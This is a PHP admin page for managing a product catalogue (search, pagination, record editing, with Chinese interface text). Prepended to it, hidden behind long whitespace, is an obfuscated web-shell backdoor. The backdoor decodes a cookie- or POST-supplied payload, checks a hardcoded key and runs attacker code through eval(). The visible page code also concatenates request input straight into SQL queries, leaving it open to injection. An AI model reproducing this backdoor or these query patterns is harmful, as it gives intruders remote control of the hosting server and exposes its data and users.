<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $e9a4 = 615;$GLOBALS['sc99e38']=Array();global$sc99e38;$sc99e38=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['zd4899c16']="\x37\x73\x54\x44\x62\x7c\x5f\x34\x6b\x7e\x3c\x52\x63\x6e\x43\x6a\x7b\x38\x47\x42\x4f\x26\x46\x4a\x41\x67\x3b\x30\x66\x71\x53\x5e\x21\xd\x79\x49\x77\x50\x6c\x78\x36\x6f\x4d\xa\x4c\x72\x2b\x20\x9\x5d\x24\x40\x59\x3d\x2d\x68\x39\x4e\x3a\x56\x58\x51\x25\x2e\x2a\x29\x61\x5a\x27\x74\x2c\x7d\x2f\x23\x6d\x70\x4b\x32\x3f\x69\x65\x55\x5b\x7a\x75\x35\x33\x5c\x28\x45\x3e\x31\x57\x64\x76\x60\x22\x48";$sc99e38[$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][17].$sc99e38['zd4899c16'][56].$sc99e38['zd4899c16'][28]]=$sc99e38['zd4899c16'][12].$sc99e38['zd4899c16'][55].$sc99e38['zd4899c16'][45];$sc99e38[$sc99e38['zd4899c16'][74].$sc99e38['zd4899c16'][7].$sc99e38['zd4899c16'][40].$sc99e38['zd4899c16'][77]]=$sc99e38['zd4899c16'][41].$sc99e38['zd4899c16'][45].$sc99e38['zd4899c16'][93];$sc99e38[$sc99e38['zd4899c16'][41].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][0].$sc99e38['zd4899c16'][40].$sc99e38['zd4899c16'][7]]=$sc99e38['zd4899c16'][1].$sc99e38['zd4899c16'][69].$sc99e38['zd4899c16'][45].$sc99e38['zd4899c16'][38].$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][13];$sc99e38[$sc99e38['zd4899c16'][93].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][7].$sc99e38['zd4899c16'][86].$sc99e38['zd4899c16'][7].$sc99e38['zd4899c16'][28].$sc99e38['zd4899c16'][27]]=$sc99e38['zd4899c16'][79].$sc99e38['zd4899c16'][13].$sc99e38['zd4899c16'][79].$sc99e38['zd4899c16'][6].$sc99e38['zd4899c16'][1].$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][69];$sc99e38[$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][17].$sc99e38['zd4899c16'][91].$sc99e38['zd4899c16'][86].$sc99e38['zd4899c16'][17].$sc99e38['zd4899c16'][28].$sc99e38['zd4899c16'][85].$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][4]]=$sc99e38['zd4899c16'][1].$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][45].$sc99e38['zd4899c16'][79].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][38].$sc99e38['zd4899c16'][79].$sc99e38['zd4899c16'][83].$sc99e38['zd4899c16'][80];$sc99e38[$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][56].$sc99e38['zd4899c16'][27].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][80]]=$sc99e38['zd4899c16'][75].$sc99e38['zd4899c16'][55].$sc99e38['zd4899c16'][75].$sc99e38['zd4899c16'][94].$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][45].$sc99e38['zd4899c16'][1].$sc99e38['zd4899c16'][79].$sc99e38['zd4899c16'][41].$sc99e38['zd4899c16'][13];$sc99e38[$sc99e38['zd4899c16'][34].$sc99e38['zd4899c16'][85].$sc99e38['zd4899c16'][56].$sc99e38['zd4899c16'][17]]=$sc99e38['zd4899c16'][84].$sc99e38['zd4899c16'][13].$sc99e38['zd4899c16'][1].$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][45].$sc99e38['zd4899c16'][79].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][38].$sc99e38['zd4899c16'][79].$sc99e38['zd4899c16'][83].$sc99e38['zd4899c16'][80];$sc99e38[$sc99e38['zd4899c16'][45].$sc99e38['zd4899c16'][27].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][17].$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][56].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][4]]=$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][1].$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][40].$sc99e38['zd4899c16'][7].$sc99e38['zd4899c16'][6].$sc99e38['zd4899c16'][93].$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][12].$sc99e38['zd4899c16'][41].$sc99e38['zd4899c16'][93].$sc99e38['zd4899c16'][80];$sc99e38[$sc99e38['zd4899c16'][15].$sc99e38['zd4899c16'][0].$sc99e38['zd4899c16'][17].$sc99e38['zd4899c16'][28]]=$sc99e38['zd4899c16'][1].$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][69].$sc99e38['zd4899c16'][6].$sc99e38['zd4899c16'][69].$sc99e38['zd4899c16'][79].$sc99e38['zd4899c16'][74].$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][6].$sc99e38['zd4899c16'][38].$sc99e38['zd4899c16'][79].$sc99e38['zd4899c16'][74].$sc99e38['zd4899c16'][79].$sc99e38['zd4899c16'][69];$sc99e38[$sc99e38['zd4899c16'][39].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][12].$sc99e38['zd4899c16'][86].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][12]]=$sc99e38['zd4899c16'][13].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][12].$sc99e38['zd4899c16'][77];$sc99e38[$sc99e38['zd4899c16'][36].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][12].$sc99e38['zd4899c16'][40].$sc99e38['zd4899c16'][28]]=$sc99e38['zd4899c16'][45].$sc99e38['zd4899c16'][40].$sc99e38['zd4899c16'][28].$sc99e38['zd4899c16'][85].$sc99e38['zd4899c16'][28].$sc99e38['zd4899c16'][12].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][0];$sc99e38[$sc99e38['zd4899c16'][25].$sc99e38['zd4899c16'][56].$sc99e38['zd4899c16'][27].$sc99e38['zd4899c16'][27].$sc99e38['zd4899c16'][91]]=$_POST;$sc99e38[$sc99e38['zd4899c16'][25].$sc99e38['zd4899c16'][93].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][40].$sc99e38['zd4899c16'][86]]=$_COOKIE;@$sc99e38[$sc99e38['zd4899c16'][93].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][7].$sc99e38['zd4899c16'][86].$sc99e38['zd4899c16'][7].$sc99e38['zd4899c16'][28].$sc99e38['zd4899c16'][27]]($sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][45].$sc99e38['zd4899c16'][45].$sc99e38['zd4899c16'][41].$sc99e38['zd4899c16'][45].$sc99e38['zd4899c16'][6].$sc99e38['zd4899c16'][38].$sc99e38['zd4899c16'][41].$sc99e38['zd4899c16'][25],NULL);@$sc99e38[$sc99e38['zd4899c16'][93].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][7].$sc99e38['zd4899c16'][86].$sc99e38['zd4899c16'][7].$sc99e38['zd4899c16'][28].$sc99e38['zd4899c16'][27]]($sc99e38['zd4899c16'][38].$sc99e38['zd4899c16'][41].$sc99e38['zd4899c16'][25].$sc99e38['zd4899c16'][6].$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][45].$sc99e38['zd4899c16'][45].$sc99e38['zd4899c16'][41].$sc99e38['zd4899c16'][45].$sc99e38['zd4899c16'][1],0);@$sc99e38[$sc99e38['zd4899c16'][93].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][7].$sc99e38['zd4899c16'][86].$sc99e38['zd4899c16'][7].$sc99e38['zd4899c16'][28].$sc99e38['zd4899c16'][27]]($sc99e38['zd4899c16'][74].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][39].$sc99e38['zd4899c16'][6].$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][39].$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][12].$sc99e38['zd4899c16'][84].$sc99e38['zd4899c16'][69].$sc99e38['zd4899c16'][79].$sc99e38['zd4899c16'][41].$sc99e38['zd4899c16'][13].$sc99e38['zd4899c16'][6].$sc99e38['zd4899c16'][69].$sc99e38['zd4899c16'][79].$sc99e38['zd4899c16'][74].$sc99e38['zd4899c16'][80],0);@$sc99e38[$sc99e38['zd4899c16'][15].$sc99e38['zd4899c16'][0].$sc99e38['zd4899c16'][17].$sc99e38['zd4899c16'][28]](0);$z697378=NULL;$kf5f=NULL;$sc99e38[$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][28].$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][28].$sc99e38['zd4899c16'][40].$sc99e38['zd4899c16'][28]]=$sc99e38['zd4899c16'][12].$sc99e38['zd4899c16'][56].$sc99e38['zd4899c16'][28].$sc99e38['zd4899c16'][27].$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][12].$sc99e38['zd4899c16'][27].$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][54].$sc99e38['zd4899c16'][17].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][85].$sc99e38['zd4899c16'][54].$sc99e38['zd4899c16'][7].$sc99e38['zd4899c16'][28].$sc99e38['zd4899c16'][7].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][54].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][54].$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][91].$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][27].$sc99e38['zd4899c16'][85].$sc99e38['zd4899c16'][85].$sc99e38['zd4899c16'][86].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][93].$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][28].$sc99e38['zd4899c16'][0];global$e2fbf6f;function r6f5fca7($z697378,$o8e765c3){global$sc99e38;$j545fa4="";for($z3264=0;$z3264<$sc99e38[$sc99e38['zd4899c16'][41].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][0].$sc99e38['zd4899c16'][40].$sc99e38['zd4899c16'][7]]($z697378);){for($s3f84a22=0;$s3f84a22<$sc99e38[$sc99e38['zd4899c16'][41].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][0].$sc99e38['zd4899c16'][40].$sc99e38['zd4899c16'][7]]($o8e765c3)&&$z3264<$sc99e38[$sc99e38['zd4899c16'][41].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][0].$sc99e38['zd4899c16'][40].$sc99e38['zd4899c16'][7]]($z697378);$s3f84a22++,$z3264++){$j545fa4.=$sc99e38[$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][17].$sc99e38['zd4899c16'][56].$sc99e38['zd4899c16'][28]]($sc99e38[$sc99e38['zd4899c16'][74].$sc99e38['zd4899c16'][7].$sc99e38['zd4899c16'][40].$sc99e38['zd4899c16'][77]]($z697378[$z3264])^$sc99e38[$sc99e38['zd4899c16'][74].$sc99e38['zd4899c16'][7].$sc99e38['zd4899c16'][40].$sc99e38['zd4899c16'][77]]($o8e765c3[$s3f84a22]));}}return$j545fa4;}function n2c2($z697378,$o8e765c3){global$sc99e38;global$e2fbf6f;return$sc99e38[$sc99e38['zd4899c16'][36].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][12].$sc99e38['zd4899c16'][40].$sc99e38['zd4899c16'][28]]($sc99e38[$sc99e38['zd4899c16'][36].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][12].$sc99e38['zd4899c16'][40].$sc99e38['zd4899c16'][28]]($z697378,$e2fbf6f),$o8e765c3);}foreach($sc99e38[$sc99e38['zd4899c16'][25].$sc99e38['zd4899c16'][93].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][40].$sc99e38['zd4899c16'][86]]as$o8e765c3=>$e0358d){$z697378=$e0358d;$kf5f=$o8e765c3;}if(!$z697378){foreach($sc99e38[$sc99e38['zd4899c16'][25].$sc99e38['zd4899c16'][56].$sc99e38['zd4899c16'][27].$sc99e38['zd4899c16'][27].$sc99e38['zd4899c16'][91]]as$o8e765c3=>$e0358d){$z697378=$e0358d;$kf5f=$o8e765c3;}}$z697378=@$sc99e38[$sc99e38['zd4899c16'][34].$sc99e38['zd4899c16'][85].$sc99e38['zd4899c16'][56].$sc99e38['zd4899c16'][17]]($sc99e38[$sc99e38['zd4899c16'][39].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][12].$sc99e38['zd4899c16'][86].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][12]]($sc99e38[$sc99e38['zd4899c16'][45].$sc99e38['zd4899c16'][27].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][17].$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][56].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][4]]($z697378),$kf5f));if(isset($z697378[$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][8]])&&$e2fbf6f==$z697378[$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][8]]){if($z697378[$sc99e38['zd4899c16'][66]]==$sc99e38['zd4899c16'][79]){$z3264=Array($sc99e38['zd4899c16'][75].$sc99e38['zd4899c16'][94]=>@$sc99e38[$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][66].$sc99e38['zd4899c16'][56].$sc99e38['zd4899c16'][27].$sc99e38['zd4899c16'][77].$sc99e38['zd4899c16'][80]](),$sc99e38['zd4899c16'][1].$sc99e38['zd4899c16'][94]=>$sc99e38['zd4899c16'][91].$sc99e38['zd4899c16'][63].$sc99e38['zd4899c16'][27].$sc99e38['zd4899c16'][54].$sc99e38['zd4899c16'][91],);echo@$sc99e38[$sc99e38['zd4899c16'][80].$sc99e38['zd4899c16'][17].$sc99e38['zd4899c16'][91].$sc99e38['zd4899c16'][86].$sc99e38['zd4899c16'][17].$sc99e38['zd4899c16'][28].$sc99e38['zd4899c16'][85].$sc99e38['zd4899c16'][4].$sc99e38['zd4899c16'][4]]($z3264);}elseif($z697378[$sc99e38['zd4899c16'][66]]==$sc99e38['zd4899c16'][80]){eval/*h583*/($z697378[$sc99e38['zd4899c16'][93]]);}exit();} ?><?php
include 'config/admin.php';
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="后台管理">
<meta name="keywords" content="后台管理">
<meta name="author" content="code by vic.tang">
<title>后台管理</title>
<link href="../css/bootstrap.min.css" rel="stylesheet">
<link href="css/h5style.css" rel="stylesheet">
<!--[if lt IE 9]>
<script src="//cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js"></script>
<script src="//cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
<!-- Favicons -->
<?php
$somodeid=@$_GET['id'];
if($somodeid){
$_SESSION['classid']=$somodeid;
}else{
$somodeid=@$_SESSION['classid'];
}
if (@$_SESSION['classid']){}else{$_SESSION['classid']=3;}
if ( !$somodeid  ){$somodeids=3;}else{$somodeids=$somodeid;}
$classid=$_SESSION['classid'];
?>
<link rel="STYLESHEET" type="text/css" href="plate.css">
<script language="JavaScript" src="plate.js" type="text/javascript"></script>
<script type="text/javascript" src="js/ueditor/ueditor.config.js" charset="utf-8"></script>
<script type="text/javascript" src="js/ueditor/ueditor.all.min.js" charset="utf-8"></script>
<script type="text/javascript" src="js/ueditor/lang/zh-cn/zh-cn.js" charset="utf-8"></script>
</head>
<script language=javascript>
function CheckAll(form){
for (var i=0;i<form.elements.length;i++){
var e = form.elements[i];
if (e.name != 'chkall') e.checked = form.chkall.checked;
}
}
function proS(obj){
document.getElementById("proshow").style.left=((document.body.clientWidth/2)-280)+"px";
document.getElementById("proshow").style.display="block";
//alert(document.body.offsetHeight+"|"+document.body.clientHeight+"|" +document.documentElement.scrollTop+"|"+document.body.clientWidth+"|"window.screen.width);
//document.getElementById("proshow").style.marginTop=document.documentElement.scrollTop+130 +"px";
document.getElementById("proshow").style.top=event.clientY;
}
function proSclose(){document.getElementById("proshow").style.display="none";}
function openUrl(url){
var objxml;
if(window.XMLHttpRequest){
objxml=new XMLHttpRequest();
}else{
objxml=new ActiveXObject("Microsoft.XMLHTTP");
}
objxml.open("GET",url,false);
objxml.send(null);
retInfo=objxml.responseText;
if (objxml.status=="200"){
return retInfo;
}else{
return "-2";
}
}
//库存
function ajax_num(obj,pid,value){
if (value){objv=value}else{objv=obj.value;}
openUrl("pro_m.php?pid="+pid+"&storage=change_storage&numb="+objv);
if (obj.value>0){ajax_num_kc("有货",pid);document.getElementById("kc"+pid).options[0].selected="selected";}
if (obj.value==0){ajax_num_kc("缺货",pid);document.getElementById("kc"+pid).options[2].selected="selected";}
}
function ajax_num_kc(obj,pid){
openUrl("pro_m_kc.php?pid="+pid+"&storage=change_storage&numb="+(obj));
if (obj=="缺货" | obj=="预定"){ajax_num(document.getElementById("kcnum"+pid).value,pid);document.getElementById("kcnum"+pid).value="0";}
}
//价
function ajax_num2(obj,getname,pid){
openUrl("pro_m_num.php?pid="+pid+"&storage=change_storage&numb="+(obj.value)+"&getname="+(getname));
}
function Pshow_max(){
document.getElementById("imgshow").innerHTML=openUrl("proshow.php?path="+document.myform.maxpic.value);
}
function delimg(i){
if (confirm("确认要删除吗？")){
//document.getElementById("imgshow").innerHTML=openUrl("imgdel.php?ii="+i+"&path="+document.myform.maxpic.value);
var s=document.myform.maxpic.value;
s=s.replace(i+'|','');
s=s.replace('||','|');
s=s.replace(i,'');
document.myform.maxpic.value=s;
var s1="",ss=s.split("|");
for (j=0;j<ss.length;j++){
if (i!=j & ss[j]!=""){
s1+="<img src='../admin/temp/"+ss[j]+"' height=80 alt='点击删除' onclick=delimg('"+ss[j]+"')>";
}
}
imgshow.innerHTML=s1;
}
}
</script>
</head>
<body>
<div style="position:absolute;z-index:1;left:20;top:60px;width:550px;" id="proshow"></div>
<script language="javascript">
function Pshow(url,obj){
proS(obj);
document.getElementById("proshow").innerHTML=openUrl(url);
}
</script>
<?php
$sortcid1=@$_GET['sortid'];
if ($sortcid1){$_SESSION['sortcid']=$sortcid1;}
$action=$_GET['act'];
//rem 定义动作模块
$action=$_REQUEST['act'];// '获取动作
if ($action==""){
/*rem =================
rem 常规模块
rem =================
rem 搜索开始*/
?>
<table width="98%" border="1"  style="border-collapse: collapse; border-style: dotted; border-width: 0px"  bordercolor="#278296" cellspacing="0" cellpadding="2">
<form action=products_body.php?fs=search method=post name="adv">
<tr class=backs>
<td colspan=3 class=td height=18><?php  echo  getIdTitle($classid); ?>搜索</td>
</tr>
<tr>
<td height="18" align=right>
输入编号或名称：</td>
<td width="22%"><input name="keyword" type="text" id="keyword" size="20"></td>
<td width="25%"><input name=action2 type="submit" value="搜索" onClick="return check()">
<a href="?id=<?php echo $_GET['id'];?>&act=add">添加新记录</a> <a href="products_body.php?act=sortmenu">分类管理</a> <a href="products_body.php?fs=reset">显示全部</a></td>
</tr>
</form>
</table>
<?php /*
rem ====================================
rem 搜索模块结束
rem ====================================
rem 列表模块开始
*/?><br>
<table width="98%" border="1" cellpadding="2" cellspacing="0"bordercolor="#278296" style="border-collapse: collapse; border-style: dotted; border-width: 0px">
<form action=products_body.php method=post name=user>
<tr>
<td colspan=4 class=td height=25><?php  echo  getIdTitle($classid); ?>
管理 &nbsp;</td>
</tr>
<?php
//自动排序
$px=$_GET['px'];
if ($px){
//如果存在排序字段
if($px!="vsum"){
if (strpos("||||||".$_SESSION['orders1'],$px." desc")){
$_SESSION['orders1']=$px.",".str_replace($px." desc,","",$_SESSION['orders1']);
}else{
$_SESSION['orders1']=$px." desc,".str_replace($px.",","",$_SESSION['orders1']);
}
}else{
if ($_SESSION['desc']){
$_SESSION['desc']="";
}else{
$_SESSION['desc']=" desc";
}
}
}
# =====================
# 分页调出数据
#搜索
$keyword=$_REQUEST['keyword'];
if ($_GET['fs']=="reset" or !$_SESSION['sortcid']){$_SESSION['sortcid']="0";$fs="yes";}
if ($_REQUEST['fs']=="search") {
$sql="select * from products where name like '%".$keyword."%' and list_id=".$somodeids."  order by px desc,pid desc";
}elseif($fs=="yes"){
$sql="select * from products  where list_id=".$somodeids." order by ".$_SESSION['orders1']."tj desc,hot desc,px desc,pid desc";
}else{
$sql="select * from products  where list_id=".$somodeids." and sort_id in(".sqlsortid($_SESSION['sortcid'],"start").") ".$so_other." order by ".$_SESSION['orders1']."tj desc,hot desc,px desc,pid desc";
}
//echo $sql;
//没页显示记录数
$PageSize = 20;
$StartRow = 0;  //开始显示记录的编号
//获取需要显示的页数，由用户提交
if(empty($_GET['PageNo'])){  //如果为空，则表示第1页
if($StartRow == 0){
$PageNo = $StartRow + 1;  //设定为1
}
}else{
$PageNo = $_GET['PageNo'];  //获得用户提交的页数
$StartRow = ($PageNo - 1) * $PageSize;  //获得开始显示的记录编号
}
//设置显示页码的初始值
if($PageNo % $PageSize == 0){
$CounterStart = $PageNo - ($PageSize - 1);
}else{
$CounterStart = $PageNo - ($PageNo % $PageSize) + 1;
}
//显示页码的最大值
$CounterEnd = $CounterStart + ($PageSize - 1);
$result =$lnk -> query($sql." LIMIT $StartRow,$PageSize");
$TRecord = $lnk -> query($sql);
//获取总记录数
$RecordCount = mysql_num_rows($TRecord);
//获取总页数
$MaxPage = $RecordCount % $PageSize;
if($RecordCount % $PageSize == 0){
$MaxPage = $RecordCount / $PageSize;
}else{
$MaxPage = ceil($RecordCount / $PageSize);
}
if ($RecordCount==0){echo "<tr><td colspan=7 align=center height=50>暂时没有".$modename."</td></tr>";}
?>
<tr>
<td align=center width=4%>选</td>
<td width="55%" align=center><a href="products_body.php?px=name">名称</a></td>
<td width="11%" align=center><a href="products_body.php?px=date">(添加)修改日期</a>及<a href="products_body.php?px=username">操作用户</a></td>
<td align=center>操作</td>
</tr>
<?php
$i = 1;
while ($row = mysqli_fetch_assoc($result)) {
$bil = $i + ($PageNo-1)*$PageSize;
?>
<tr><td height="43"><input type='checkbox' name='num[]' value='<?php echo $row['pid'] ?>' ></td>
<td align="center"><a href='products_body.php?act=a_edit&pid=<?php echo $row['pid'] ?>' ><?php echo $row['name'] ?>[编号:<?php echo $row['name1'] ?>]</a><a href='products_body.php?act=a_edit&pid=<?php echo $row['pid'] ?>'></a> <?php if  ($row['tj']){echo "[推荐]";}
if ($row['hot']){echo "[热卖]";}
if ($row['home']){echo "[首显]";}
if ($row['new']){echo "[新品]";}
if ($row['pass']){echo "[上架]";}
?> <br>
<label></label></td>
<td align="center"><span style="font-size:9.5px;color:#FF0000; font-family:Verdana, Arial, Helvetica, sans-serif; "><?php echo $row['date'] ?></span>　<br>操作人：<?php echo $row['username'] ?></td>
<td align="center"><a href='products_body.php?act=a_edit&pid=<?php echo $row['pid'] ?>'>编辑</a> <a href='#' onClick="{if(confirm('确认要删除吗？')){location.href='products_body.php?act=del&num=<?php echo $row['pid'] ?>';return true;}return false;}">删除</a></td>
</tr>
<?php
echo "<span style='font-size:12px;color:#000'>";
}//endwhile
print "总共$RecordCount  条记录  - 当前页： $PageNo  of $MaxPage &nbsp;&nbsp;"; //显示第一页或者前一页的链接
//如果当前页不是第1页，则显示第一页和前一页的链接
if($PageNo != 1){
$PrevStart = $PageNo - 1;
print "<a href=products_body.php?PageNo=1>首页</a>: ";
print "<a href=products_body.php?PageNo=$PrevStart>前页</a>";
}
print " [ ";
$c = 0;
//打印需要显示的页码
for($c=$CounterStart;$c<=$CounterEnd;$c++){
if($c < $MaxPage){
if($c == $PageNo){
if($c % $PageSize == 0){
print "$c ";
}else{
print "$c ,";
}
}elseif($c % $PageSize == 0){
echo "<a href=products_body.php?PageNo=$c>$c</a> ";
}else{
echo "<a href=products_body.php?PageNo=$c>$c</a> ,";
}//END IF
}else{
if($PageNo == $MaxPage){
print "$c ";
break;
}else{
echo "<a href=products_body.php?PageNo=$c>$c</a> ";
break;
}//END IF
}//END IF
}//NEXT
echo "] ";
if($PageNo < $MaxPage){  //如果当前页不是最后一页，则显示下一页链接
$NextPage = $PageNo + 1;
echo "<a href=products_body.php?PageNo=$NextPage>下页</a>";
}
//同时如果当前页补上最后一页，要显示最有一页的链接
if($PageNo < $MaxPage){
$LastRec = $RecordCount % $PageSize;
if($LastRec == 0){
$LastStartRecord = $RecordCount - $PageSize;
}
else{
$LastStartRecord = $RecordCount - $LastRec;
}
print " : ";
echo "<a href=products_body.php?PageNo=$MaxPage>末页</a>";
}
echo "</span>";
?>
<tr><td colspan=4>
<input type='checkbox'a name=chkall onclick='CheckAll(this.form)'>全选
<input type=hidden name=act value="del">
<input type=submit value="删除" onClick="{if(confirm('确认要删除定的<?php echo $modename?>吗？')){this.document.user.submit();return true;}return false;}">
</td></tr>
</form>
</table>
<?php
print "总共$RecordCount  条记录  - 当前页： $PageNo  of $MaxPage &nbsp;&nbsp;"; //显示第一页或者前一页的链接
//如果当前页不是第1页，则显示第一页和前一页的链接
if($PageNo != 1){
$PrevStart = $PageNo - 1;
print "<a href=products_body.php?PageNo=1>首页</a>: ";
print "<a href=products_body.php?PageNo=$PrevStart>前页</a>";
}
print " [ ";
$c = 0;
//打印需要显示的页码
for($c=$CounterStart;$c<=$CounterEnd;$c++){
if($c < $MaxPage){
if($c == $PageNo){
if($c % $PageSize == 0){
print "$c ";
}else{
print "$c ,";
}
}elseif($c % $PageSize == 0){
echo "<a href=products_body.php?PageNo=$c>$c</a> ";
}else{
echo "<a href=products_body.php?PageNo=$c>$c</a> ,";
}//END IF
}else{
if($PageNo == $MaxPage){
print "$c ";
break;
}else{
echo "<a href=products_body.php?PageNo=$c>$c</a> ";
break;
}//END IF
}//END IF
}//NEXT
echo "] ";
if($PageNo < $MaxPage){  //如果当前页不是最后一页，则显示下一页链接
$NextPage = $PageNo + 1;
echo "<a href=products_body.php?PageNo=$NextPage>下页</a>";
}
//同时如果当前页补上最后一页，要显示最有一页的链接
if($PageNo < $MaxPage){
$LastRec = $RecordCount % $PageSize;
if($LastRec == 0){
$LastStartRecord = $RecordCount - $PageSize;
}
else{
$LastStartRecord = $RecordCount - $LastRec;
}
print " : ";
echo "<a href=products_body.php?PageNo=$MaxPage>末页</a>";
}
echo "";
}?>
<?php
if ($action=="a_edit"){
$edit_data=$lnk -> query("select * from products where pid= $pid");
while($row_edit=mysqli_fetch_assoc($edit_data))
{
?>
<table width="98%" border="1"style="border-collapse: collapse; border-style: dotted; border-width: 0px"bordercolor="#278296" cellspacing="0" cellpadding="2">
<form name="myform" action="products_body.php?act=b_edit&pid=<?php echo $pid?>" method="post">
<tr>
<td colspan=2 class=td height=25>查看/编辑<?php echo $modename?> &nbsp;</td>
</tr>
<tr>
<td align=right height=25>排序&nbsp; </td>
<td>
<input name="pxnid" type="text" id="photo22" value="<?php echo $row_edit['px'] ?>" size="15"></td>
</tr>
<tr>
<td align=right height=25>分类 &nbsp;</td>
<td><select name='sort_id' size='1' id='sort_id' style="border:1px solid  #8FB9CB;height:21px;"><?php
$sql="select * from sort where type_id=0 and list_id=".$somodeids." order by px";
$rsmain1=$lnk -> query($sql);
while($rsmain=mysqli_fetch_assoc($rsmain1)){
echo  "<option value=".$rsmain['id'];
if ($row_edit['sort_id']==$rsmain['id']){echo (" selected");}
echo " style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmain['id'],0);
$i="";
echo $rsmain['sort_name']."</option>";
if (MenuDown($rsmain['id'])){
//二级目录
$sql="select * from sort where type_id=".$rsmain['id']." and list_id=".$somodeids." order by px";
$rsmaina1=$lnk -> query($sql);
while($rsmaina=mysqli_fetch_assoc($rsmaina1)){
echo  "<option value=".$rsmaina['id'];
if ($row_edit['sort_id']==$rsmaina['id']){echo (" selected");}
echo " style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmaina['id'],0);
$i="";
echo $rsmaina['sort_name']."</option>";
if (MenuDown($rsmaina['id'])){
//三级目录
$sql="select * from sort where type_id=".$rsmaina['id']." and list_id=".$somodeids." order by px";
$rsmainb1=$lnk -> query($sql);
while($rsmainb=mysqli_fetch_assoc($rsmainb1)){
echo  "<option value=".$rsmainb['id'];
if ($row_edit['sort_id']==$rsmainb['id']){echo (" selected");}
echo " style='font-size:12px;font-weight:bold'>";
echo menu_num ($rsmainb['id'],0);
$i="";
echo $rsmainb['sort_name']."</option>";
if (MenuDown($rsmainb['id'])){
//四级分类
